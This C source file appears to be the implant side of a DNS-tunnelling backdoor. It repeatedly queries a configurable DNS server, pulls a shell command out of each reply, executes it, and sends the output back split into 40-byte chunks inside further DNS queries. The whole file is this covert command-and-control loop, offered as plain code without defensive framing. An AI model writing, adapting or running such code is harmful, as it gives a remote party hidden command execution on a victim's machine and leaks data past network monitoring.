
#include"header.h"
#include"dns_packet_op.h"
#include"exec_shell_cmd.h"

#ifndef DNS_SERVER_IP
#define DNS_SERVER_IP           "127.0.0.1"
#endif

int main()
{
        int sockfd;
        int port = 53;
        int res;
        int len;
        struct sockaddr_in local_sa;
        struct sockaddr_in dest_sa;
        char *ptr;
        char buf[512];
        char cmd[128];
        char cmd_res[2048];
        dq_t request;

        sockfd = socket(AF_INET,SOCK_DGRAM,0);
        if (sockfd == -1) {
                perror("socket:");
                exit(1);
        }

        local_sa.sin_family = AF_INET;
        local_sa.sin_port = htons(port);
        local_sa.sin_addr.s_addr = inet_addr(DNS_SERVER_IP);

        while (1) {
                memset((unsigned char *)&request,0,sizeof(request));

                strcpy((char *)(request.domain_name),"helloworld");
                request.dn_length = strlen("helloworld");
                request.packet_flag = 0x3423;
                make_dns_request_pk(&request);
                len = sizeof(struct sockaddr_in);
                res = sendto(sockfd,request.req_buf,request.req_buf_length,0,(struct sockaddr *)&local_sa,len);
                //printf("res : %d\n",res);
                if (res == -1) {
                        //perror("sendto:");
                        continue;
                }

                res = recvfrom(sockfd,buf,512,0,(struct sockaddr *)&dest_sa,(socklen_t *)&len);
                res = parse_dns_packet_res((unsigned char *)buf,res,(unsigned char *)cmd,128);
                //printf("parse_dns_packet_res res:%d\n",res);
                if (res > 0) {
                        memset(cmd_res,0,2048);
                        res = exec_shell_cmd(cmd,cmd_res,2048);
                        if (res == 0) {
                                continue;
                        }
                        ptr = cmd_res;
                #define MAX_PK_DOMAIN_NAME_LENGTH       40
                        while (1) {
                                if (res > MAX_PK_DOMAIN_NAME_LENGTH) {
                                        memcpy(request.domain_name,ptr,MAX_PK_DOMAIN_NAME_LENGTH);
                                        request.dn_length = MAX_PK_DOMAIN_NAME_LENGTH;
                                        request.packet_flag++; 
                                        make_dns_request_pk(&request);
                                        len = sizeof(struct sockaddr_in);
                                        sendto(sockfd,request.req_buf,request.req_buf_length,0,(struct sockaddr *)&local_sa,len);
                                        //recvfrom(sockfd,buf,512,0,(struct sockaddr *)&dest_sa,&len);
                                        ptr += MAX_PK_DOMAIN_NAME_LENGTH;
                                        res -= MAX_PK_DOMAIN_NAME_LENGTH;
                                }else{
                                        memcpy(request.domain_name,ptr,res);
                                        //printf("mk req:%d\n",res);
                                        //printf("domain name:%s\n",ptr);
                                        request.dn_length = res;
                                        request.packet_flag++; 
                                        make_dns_request_pk(&request);
                                        len = sizeof(struct sockaddr_in);
                                        sendto(sockfd,request.req_buf,request.req_buf_length,0,(struct sockaddr *)&local_sa,len);
                                        //recvfrom(sockfd,buf,512,0,(struct sockaddr *)&dest_sa,&len);
                                        //printf("send success\n");
                                        break;
                                }
                        }
                }
        } 
}

